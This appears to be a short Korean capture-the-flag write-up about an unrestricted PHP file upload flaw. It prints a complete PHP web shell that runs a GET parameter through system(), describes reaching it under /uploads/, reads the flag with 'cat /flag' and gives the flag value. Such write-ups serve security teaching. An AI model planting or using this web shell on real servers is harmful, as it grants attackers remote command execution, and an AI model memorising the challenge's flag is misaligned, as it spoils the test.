# 라업
- `/upload.php`에서 파일을 업로할 때 확장자를 체크하지 않아서 웹쉘을 올릴 수 있음

- PHP 웹쉘(exploit.php) 예시
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

- 업로드 후 저장되는 파일명을 알려주는데, dockerfile을 확인 후 /uploads/[웹쉘 파일명] 경로를 접속해 웹쉘 사용
- cat /flag 으로 플래그 확인 


# 플래그
K0{upl04d_w1th0ut_ch3ck_1s_d4ng3r0us}

# 설명
PHP 파일 업로드 취약점
